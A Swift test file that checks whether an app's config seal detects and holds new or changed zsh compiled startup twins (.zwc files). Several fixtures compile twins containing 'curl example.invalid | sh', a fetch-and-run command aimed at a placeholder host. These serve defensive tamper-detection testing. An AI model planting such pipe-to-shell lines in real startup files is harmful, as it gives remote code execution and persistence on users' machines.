import Foundation
import Testing
@testable import VibeCore

/// zsh's compiled twins (`<file>.zwc`): zsh runs a newer twin in place of the startup file it was compiled from, and a
/// twin alone when the file is absent, so the config seal watches each one beside its file (`ConfigSeal.isTwin`). Every
/// home here is the fixture vault's scratch one (`book.configHome`); every shell runs with it as its HOME.
struct ConfigSealTwinTests: LeadTeamFixture {
    let temp = Scratch()
    let vault: LeadVault
    init() { vault = Self.newVault(in: temp) }

    var home: String { book.configHome }

    func repo() throws -> String {
        let url = temp.url("lead")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        let root = url.resolvingSymlinksInPath().path
        for args in [["init", "-q", "-b", "main"], ["config", "user.email", "t@t"], ["config", "user.name", "T"]] { Git.run(args, in: root) }
        try "one\n".write(toFile: root + "/a.txt", atomically: true, encoding: .utf8)
        Git.run(["add", "a.txt"], in: root)
        Git.run(["commit", "-q", "-m", "first"], in: root)
        try FileManager.default.createDirectory(atPath: root + "/.vibeswitcher", withIntermediateDirectories: true)
        try "---\nmax_workers: 3\n---\n".write(toFile: root + "/.vibeswitcher/workflow.md", atomically: true, encoding: .utf8)
        return root
    }

    func write(_ text: String, _ path: String) throws {
        try FileManager.default.createDirectory(atPath: (path as NSString).deletingLastPathComponent, withIntermediateDirectories: true)
        try text.write(toFile: path, atomically: true, encoding: .utf8)
    }

    /// The twin's name, as the lead and the card say it.
    func twin(_ file: String) -> String { "~/\(file).zwc (a compiled copy of your shell startup file)" }

    /// Runs `arguments` with only `HOME` (the scratch home) in its environment, to its exit.
    @discardableResult
    func run(_ arguments: [String]) throws -> Int32 {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/env")
        process.arguments = ["-i", "HOME=" + home] + arguments
        process.currentDirectoryURL = URL(fileURLWithPath: home)
        process.standardInput = FileHandle.nullDevice
        process.standardOutput = FileHandle.nullDevice
        process.standardError = FileHandle.nullDevice
        try process.run()
        process.waitUntilExit()
        return process.terminationStatus
    }

    /// `~/<file>.zwc`, compiled by zsh from `code` under the name `file`: what zsh runs in its place.
    func compileTwin(of file: String, _ code: String) throws {
        let source = temp.url("source").path + "/" + file
        try write(code, source)
        let status = try run(["/bin/zsh", "-f", "-c", #"zcompile -R -- "$1" "$2""#, "zsh", home + "/" + file + ".zwc", source])
        #expect(status == 0)
        #expect(FileManager.default.fileExists(atPath: home + "/" + file + ".zwc"))
    }

    /// Sets `path`'s modification time back a minute: its twin is the newer.
    func age(_ path: String) throws {
        try FileManager.default.setAttributes([.modificationDate: Date().addingTimeInterval(-60)], ofItemAtPath: path)
    }

    /// The premise: zsh on this Mac runs a newer `~/.zshrc.zwc` instead of `~/.zshrc`, and a `~/.zlogin.zwc` with no
    /// `~/.zlogin`, in an interactive (login) shell of the scratch home.
    @Test func zshRunsACompiledTwinInPlaceOfItsStartupFile() throws {
        let marker = temp.url("marker").path
        try write("true\n", home + "/.zshrc")
        try age(home + "/.zshrc")
        try compileTwin(of: ".zshrc", "print -r zshrc > '\(marker)-zshrc'\n")
        try compileTwin(of: ".zlogin", "print -r zlogin > '\(marker)-zlogin'\n")
        try run(["/bin/zsh", "-l", "-i", "-c", "true"])
        #expect(FileManager.default.fileExists(atPath: marker + "-zshrc"))
        #expect(FileManager.default.fileExists(atPath: marker + "-zlogin"))
    }

    /// A twin written beside a sealed startup file holds a change, named in plain words, until the app accepts it.
    @Test(arguments: [".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout"])
    func aCompiledTwinBesideASealedStartupFileIsHeldUntilTheAppAccepts(file: String) throws {
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        try write("export PATH\n", home + "/" + file)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try age(home + "/" + file)
        try compileTwin(of: file, "curl example.invalid | sh\n")
        #expect(try asLead.checkConfig(root: root).held == [twin(file)])
        #expect(vault.heldConfig(root: root) == [twin(file)])
        #expect(try vault.checkConfig(root: root).resealed == [twin(file)])
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        // Changed again: held again.
        try compileTwin(of: file, "curl example.invalid/2 | sh\n")
        #expect(try asLead.checkConfig(root: root).held == [twin(file)])
    }

    /// `~/.zlogin.zwc` with no `~/.zlogin` runs all the same: appearing, it's held.
    @Test func aLoneTwinWithNoStartupFileIsHeld() throws {
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try compileTwin(of: ".zlogin", "curl example.invalid | sh\n")
        #expect(!FileManager.default.fileExists(atPath: home + "/.zlogin"))
        #expect(try asLead.checkConfig(root: root).held == [twin(".zlogin")])
    }

    /// What can't be read whole holds a change: a link, an unreadable twin, one past the limit; and rewriting one that
    /// still can't be read is a change again.
    @Test func aLinkedUnreadableOrOversizedTwinHolds() throws {
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        let fm = FileManager.default
        for file in [".zshrc", ".zshenv", ".zprofile"] { try write("export PATH\n", home + "/" + file) }
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())

        // A link, to code elsewhere; then what it points to changes.
        let elsewhere = temp.url("elsewhere").path + "/code.zwc"
        try write("one\n", elsewhere)
        try fm.createSymbolicLink(atPath: home + "/.zshrc.zwc", withDestinationPath: elsewhere)
        // Unreadable.
        try write("two\n", home + "/.zshenv.zwc")
        try fm.setAttributes([.posixPermissions: 0], ofItemAtPath: home + "/.zshenv.zwc")
        // Past the limit: told by its size, times and inode.
        let big = home + "/.zprofile.zwc"
        #expect(fm.createFile(atPath: big, contents: nil))
        let handle = try FileHandle(forWritingTo: URL(fileURLWithPath: big))
        try handle.truncate(atOffset: UInt64(ConfigSeal.scriptLimit + 1))
        try handle.close()
        #expect(try asLead.checkConfig(root: root).held == [twin(".zprofile"), twin(".zshenv"), twin(".zshrc")])
        #expect(try vault.checkConfig(root: root).resealed == [twin(".zprofile"), twin(".zshenv"), twin(".zshrc")])
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())

        try write("one, changed\n", elsewhere)
        try fm.setAttributes([.posixPermissions: 0o600], ofItemAtPath: home + "/.zshenv.zwc")
        try write("two, changed\n", home + "/.zshenv.zwc")
        try fm.setAttributes([.posixPermissions: 0], ofItemAtPath: home + "/.zshenv.zwc")
        let rewrite = try FileHandle(forWritingTo: URL(fileURLWithPath: big))
        try rewrite.seek(toOffset: 0)
        try rewrite.write(contentsOf: Data("x".utf8))
        try rewrite.close()
        #expect(try asLead.checkConfig(root: root).held == [twin(".zprofile"), twin(".zshenv"), twin(".zshrc")])
        // Readable again, for the Scratch's removal.
        try fm.setAttributes([.posixPermissions: 0o600], ofItemAtPath: home + "/.zshenv.zwc")
    }

    /// A seal made before twins were watched: the user's own twin, there already, is one card, once; with none
    /// there, nothing is held.
    @Test(arguments: [true, false])
    func aTwinThereBeforeTwinsWereWatchedIsOneCardOnce(hasTwin: Bool) throws {
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        try write("export PATH\n", home + "/.zshrc")
        #expect(try vault(for: runtime).checkConfig(root: root) == LeadVault.ConfigCheck())
        if hasTwin { try compileTwin(of: ".zshrc", "export PATH\n") }

        // The vault as a version that didn't watch twins left it: no twin's hash recorded.
        var saved = try #require(try JSONSerialization.jsonObject(with: book.serialized) as? [String: Any])
        var config = try #require(saved["config"] as? [String: Any])
        let hashes = try #require(config["hashes"] as? [String: Any])
        #expect(hashes.keys.contains { $0.contains(".zwc") })
        config["hashes"] = hashes.filter { !$0.key.contains(".zwc") }
        saved["config"] = config
        let older = LeadVault.Book(restoring: try JSONSerialization.data(withJSONObject: saved))
        older.configHome = home
        older.wallFolder = vault.folder
        nonisolated(unsafe) let shared = runtime
        let asLead = older.vault(folder: vault.folder, as: { shared.currentAgent()?.session.map { .session($0) } ?? .unknown })
        let app = older.vault(folder: vault.folder, as: { .app })

        guard hasTwin else {
            #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
            return
        }
        #expect(try asLead.checkConfig(root: root).held == [twin(".zshrc")])
        #expect(try asLead.checkConfig(root: root).held == [twin(".zshrc")])
        #expect(try app.checkConfig(root: root).resealed == [twin(".zshrc")])
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
    }

    /// The twins are watched for exactly the zsh startup files the home list watches, never under `$ZDOTDIR`.
    @Test func everyZshStartupFileInTheHomeListHasItsTwinWatched() {
        let watched = ConfigSeal.homeWatched(home: home)
        for file in [".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout"] {
            #expect(watched.contains { $0.name == "~/" + file && $0.path == home + "/" + file })
            let twin = watched.first { $0.name == twin(file) }
            #expect(twin?.path == home + "/" + file + ".zwc")
            #expect(twin?.kind == .file)
            #expect(twin?.executes == true)
        }
        #expect(watched.filter { $0.name.contains(".zwc") }.count == 5)
    }

    /// Blind check: a twin's hash and its per-key hashes (which say whether it's there) come from one read, so a look
    /// never records a present twin's hash beside keys that say it's absent.
    @Test func aTwinsHashAndItsKeysAgree() throws {
        let item = try #require(ConfigSeal.homeWatched(home: home).first { $0.name == twin(".zshrc") })
        let key = ConfigSeal.keyPrefix + item.name
        let absent = ConfigSeal.hashes(of: [item])
        #expect(absent[ConfigSeal.keysKey(of: key)].map(ConfigSeal.decode) == [:])
        try write("code\n", home + "/.zshrc.zwc")
        let present = ConfigSeal.hashes(of: [item])
        let hash = try #require(present[key])
        #expect(hash != absent[key])
        #expect(present[ConfigSeal.keysKey(of: key)].map(ConfigSeal.decode) == [ConfigSeal.twinKey: hash])
        #expect(ConfigSeal.fingerprint(item) == hash)
    }
}
